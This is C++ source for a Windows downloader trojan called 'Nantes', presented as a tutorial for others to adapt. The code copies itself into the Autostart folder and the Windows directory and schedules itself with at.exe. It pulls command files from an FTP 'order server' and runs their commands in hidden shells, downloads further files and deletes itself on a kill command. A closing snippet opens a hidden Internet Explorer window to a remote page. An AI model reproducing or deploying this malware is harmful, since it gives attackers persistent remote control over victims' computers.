/*

   Welcome to the Nantes source-code. Edit it so that it fits your needs.

   This shows how a basic not-so-stealth downloader works, console app

   style.

   Author: ShellExecute

*/

#include <windows.h>

#include <fstream>

#include <cstdlib>

using namespace std;

const char filename[] = "nantes.exe";	//there's got to be a function for this

const char altExe[] = "c:\\windows\\catch16.exe";	//16 is the hex value of 22, and also a the bit-size of a WORD

int getFileFromOrderServer (char *fileFromServer, char *localFile);

int interpretFile (char *filnamn);

int dlFile (char *ip, int port, char *utfil);

void SelfDelete ();

int
main ()
{

  WSADATA wsaData;

  WSAStartup (MAKEWORD (2, 2), &wsaData);

  //Now, because this is a tutorial code and it's not suppose to be a "compile and run just for fun" file

  //I've made it as a console app. Sure, you can use FreeConsole() but it will still cause a "blip".

  //setting some stuff that's important

  int count = 0;

  TCHAR allUserAutostart[MAX_PATH], atFolder[MAX_PATH], tolk[MAX_PATH];

  GetEnvironmentVariable ("AllUsersProfile", allUserAutostart, MAX_PATH);

  strcat (allUserAutostart, "\\Start-meny\\Program\\Autostart\\");

  strcat (allUserAutostart, filename);

  GetEnvironmentVariable ("SystemDirectory", atFolder, MAX_PATH);

  GetEnvironmentVariable ("ComSpec", tolk, MAX_PATH);

  strcat (atFolder, "at.exe");

  char buf[256], addToAutostart[128], addToWindows[128];

  while (count <= 128)
    {

      addToAutostart[count] = 0x00;

      addToWindows[count] = 0x00;

      count++;

    }

  strcat (addToAutostart, "/c copy /Y ");

  strcat (addToAutostart, filename);

  strcat (addToAutostart, " ");

  strcat (addToAutostart, allUserAutostart);

  strcat (addToWindows, "/c copy /Y ");

  strcat (addToWindows, filename);

  strcat (addToWindows, " ");

  strcat (addToWindows, altExe);

  //infecting the computer

  ShellExecute (0, 0, tolk, addToAutostart, 0, SW_HIDE);

  ShellExecute (0, 0, tolk, addToWindows, 0, SW_HIDE);

  char atVaxel[256];

  count = 0;

  while (count <= sizeof (atVaxel))
    {

      atVaxel[count] = 0x00;

      count++;

    }

  strcat (atVaxel, "10:15 ");

  strcat (atVaxel, altExe);

  ShellExecute (0, 0, atFolder, "/delete /yes", 0, SW_HIDE);

  ShellExecute (0, 0, atFolder, atVaxel, 0, SW_HIDE);

  //that pretty much finishes the infestation part

  //getting the orderfiles

  int s1 = getFileFromOrderServer ("global.order", "glb.tmp");

  if (s1 != 0)
    {

      DeleteFile ("glb.tmp");

      DeleteFile ("lcl.tmp");

      return 0;

    }

  s1 = getFileFromOrderServer ("sal209.order", "lcl.tmp");

  if (s1 != 0)
    {

      DeleteFile ("glb.tmp");

      DeleteFile ("lcl.tmp");

      return 0;

    }
  //interpreting the orderfiles

  s1 = interpretFile ("glb.tmp");

  if (s1 == 666)		//if !K is used

    {

      DeleteFile ("glb.tmp");

      DeleteFile ("lcl.tmp");

      SelfDelete ();

      return 0;

    }

  if (s1 != 0)
    {

      DeleteFile ("glb.tmp");

      DeleteFile ("lcl.tmp");

      return 0;

    }

  s1 = interpretFile ("lcl.tmp");

  if (s1 == 666)
    {

      DeleteFile ("lcl.tmp");

      DeleteFile ("glb.tmp");

      SelfDelete ();

      return 0;

    }

  if (s1 != 0)
    {

      DeleteFile ("glb.tmp");

      DeleteFile ("lcl.tmp");

      return 0;

    }
  //getting rid of the temporary files

  DeleteFile ("glb.tmp");

  DeleteFile ("lcl.tmp");

  //shutting down

  return 0;

}

int
getFileFromOrderServer (char *fileFromServer, char *localFile)
{

  int count = 0, c2 = 0;

  char bitEtt[4], bitTva[4];	//this is the two 8-bit parts of the port received by the PASV command

  int bitEttInt = 0, bitTvaInt = 0;

  /*

     The return values for this function is:

     0 - Ok :)

     1 - connection problem

     2 - Protocol or server problems

     3 - other problem

   */

  SOCKET cmdSock;		//creating the socket we'll use for communicating with the FTP server

  cmdSock = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);

  if (cmdSock == INVALID_SOCKET)	//failcheck

    {

      WSACleanup ();

      return 3;

    }

  sockaddr_in cmdSockData;

  cmdSockData.sin_family = AF_INET;

  cmdSockData.sin_addr.s_addr = inet_addr ("127.0.0.1");	//this is important, change this to the IP of the orderserver

  cmdSockData.sin_port = htons (21);	//This is the port for the server, change if needed

  if (connect (cmdSock, (SOCKADDR *) & cmdSockData, sizeof (cmdSockData))
      == SOCKET_ERROR)
    {

      WSACleanup ();

      return 1;

    }

  char junkBuf[1024];		//change size if MOTD is big

  //this part doesn't have proper failchecks, so if this shit doesn't work you can:

  //1. Add failchecking

  //2. Monitor the traffic using a packet sniffer

  //But it should work.

  recv (cmdSock, junkBuf, sizeof (junkBuf), 0);

  send (cmdSock, "USER ShellExecute\r\n", 19, 0);	//the username, dont forget to change the bytelen

  recv (cmdSock, junkBuf, sizeof (junkBuf), 0);	//for confirmation

  send (cmdSock, "PASS tHiSiStRuLyMyReAlPaSsWoRd\r\n", 32, 0);	//Doh, pass.

  recv (cmdSock, junkBuf, sizeof (junkBuf), 0);

  if (junkBuf[0] != '2' || junkBuf[1] != '3' || junkBuf[2] != '0')	//failcheck for login

    {

      closesocket (cmdSock);

      return 2;			//I count this as a server prob.

    }

  send (cmdSock, "TYPE I\r\n", 8, 0);	//It's easier to always have Image type transfer (binary)

  recv (cmdSock, junkBuf, sizeof (junkBuf), 0);

  if (junkBuf[0] != '2' || junkBuf[1] != '0' || junkBuf[2] != '0')
    {

      closesocket (cmdSock);

      return 2;

    }

  count = 0;

  while (count < sizeof (junkBuf))
    {

      junkBuf[count] = 0x00;

      count++;

    }

  send (cmdSock, "PASV\r\n", 6, 0);

  recv (cmdSock, junkBuf, sizeof (junkBuf), 0);

  if (junkBuf[0] != '2' || junkBuf[1] != '2' || junkBuf[2] != '7')	//might also be 200 depending on server

    {

      closesocket (cmdSock);

      return 2;			//if the server can't handle this, it's not RFC 959 compilant

    }

  char *ipDownload;

  int ip[4];

  int port[2];

  char newhost[48];

  char *newhostp = NULL;

  unsigned short newport = 0;

  ipDownload = new char[128];

  strcat (ipDownload, junkBuf);

  while (*ipDownload)
    {

      if (6 == sscanf (ipDownload, "%d,%d,%d,%d,%d,%d",
		       &ip[0], &ip[1], &ip[2], &ip[3], &port[0], &port[1]))

	break;

      ipDownload++;

    }

  if (!*ipDownload)
    {

      closesocket (cmdSock);

      return 3;

    }

  sprintf (newhost, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);

  newhostp = newhost;		//this is the IP for the retrieval file

  newport = (port[0] << 8) + port[1];	//and this is the port

  char retrFile[128];

  count = 0;

  while (count <= sizeof (retrFile))
    {

      retrFile[count] = 0x00;

      count++;

    }

  strcat (retrFile, "RETR ");

  strcat (retrFile, fileFromServer);

  strcat (retrFile, "\r\n");

  send (cmdSock, retrFile, strlen (retrFile), 0);

  int dlFailCheck = dlFile (newhostp, newport, localFile);

  if (dlFailCheck != 0)
    {

      closesocket (cmdSock);

      return 3;

    }

  send (cmdSock, "QUIT\r\n", 6, 0);

  closesocket (cmdSock);

  return 0;

}

int
interpretFile (char *filnamn)
{

  char line[256], vaxel1[256], vaxel2[256];

  int count = 0, c2 = 0;

  TCHAR tolk[MAX_PATH];

  GetEnvironmentVariable ("ComSpec", tolk, MAX_PATH);

  ifstream tolkning;

  tolkning.open (filnamn);

  char executeCmd[256];

  //getting lines from orderfiles

  while (tolkning.getline (line, 256))
    {

      //this is where you can add your own phrases, or modify the existing

      if ((int) line[0] == 33 && (int) line[1] == 67)	// !C

	{

	  count = 0;

	  while (count < sizeof (executeCmd))
	    {

	      executeCmd[count] = 0x00;

	      count++;

	    }

	  count = 3;

	  while (count < 256)
	    {

	      (int) vaxel1[count - 3] = (int) line[count];

	      count++;

	    }

	  strcat (executeCmd, "/c ");

	  strcat (executeCmd, vaxel1);

	  ShellExecute (0, 0, tolk, executeCmd, 0, SW_HIDE);

	}

      if ((int) line[0] == 33 && (int) line[1] == 66)	// !B

	{

	  count = 3;

	  c2 = 0;

	  while ((int) line[count] != 32)
	    {

	      (int) vaxel1[c2] = (int) line[count];

	      count++;

	      c2++;

	    }

	  count++;

	  c2 = 0;

	  while ((int) line[count] != 33)
	    {

	      (int) vaxel2[c2] = (int) line[count];

	      count++;

	      c2++;

	    }

	  getFileFromOrderServer (vaxel1, vaxel2);

	  count = 0;

	  c2 = 0;

	}

      if ((int) line[0] == 33 && (int) line[1] == 75)	// !K

	return 666;

      count = 0;

      while (count < 256)	//reset line

	{

	  line[count] = 0x00;

	  count++;

	}

      count = 0;

      while (count < 256)	//reset vaxel1

	{

	  vaxel1[count] = 0x00;

	  count++;

	}

      count = 0;

      while (count < 256)	//reset vaxel2

	{

	  vaxel2[count] = 0x00;

	  count++;

	}

    }

  tolkning.close ();

  return 0;

}

void
SelfDelete ()			//I got this from the net, but I can't recall from where
{				//but I think it was from FB, credz to the guy who wrote it

  TCHAR szFile[MAX_PATH], szCmd[MAX_PATH];

  if ((GetModuleFileName (0, szFile, MAX_PATH) != 0) &&
      (GetShortPathName (szFile, szFile, MAX_PATH) != 0))
    {

      lstrcpy (szCmd, "/c del ");

      lstrcat (szCmd, szFile);

      lstrcat (szCmd, " >> NUL");

      if ((GetEnvironmentVariable ("ComSpec", szFile, MAX_PATH) != 0) &&
	  ((INT) ShellExecute (0, 0, szFile, szCmd, 0, SW_HIDE) > 32))

	return;

    }

  return;

}

int
dlFile (char *ip, int port, char *utfil)
{

  int count = 0;

  char retrFileBuf[128];

  SOCKET retrSock;

  retrSock = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);

  if (retrSock == INVALID_SOCKET)
    {

      WSACleanup ();

      return 3;

    }

  sockaddr_in retrSockData;

  retrSockData.sin_family = AF_INET;

  retrSockData.sin_addr.s_addr = inet_addr (ip);

  retrSockData.sin_port = htons (port);

  if (connect
      (retrSock, (SOCKADDR *) & retrSockData, sizeof (retrSockData))
      == SOCKET_ERROR)
    {

      WSACleanup ();

      return 1;

    }

  ofstream retrUt;

  retrUt.open (utfil, ios::binary);

  if (!retrUt)
    {

      MessageBox (NULL, utfil, "Unable to open:", MB_OK);

      closesocket (retrSock);

      return 3;

    }

  count = 0;

  while (count <= sizeof (retrFileBuf))
    {

      retrFileBuf[count] == 0x00;

      count++;

    }

  count = 666;			//just for the safety of the cause

  while (count > 0)
    {

      count = recv (retrSock, retrFileBuf, sizeof (retrFileBuf), 0);

      retrUt.write ((char *) &retrFileBuf, count);

    }

  retrUt.close ();

  closesocket (retrSock);

  return 0;

}

The use
  Okey, now weve got a downloader,
  how can we use it ? Take a look at the source - code below.
/*

  this patch opens iexplore to run without a window in the background.

  the webpage it opens should have <BGSOUND SRC="path_to_music_file.mp3">

  in it. 

*/
#include <windows.h>
  using namespace std;

int
main ()
{

  ShellExecute (0, 0, "iexplore",
		"http://www.musicserver.com/bgplay.html", 0, SW_HIDE);

  return 0;

}

//the biggest project I've ever had :p. Don't forget to add the selfdelete

//function. You don't want this laying around.
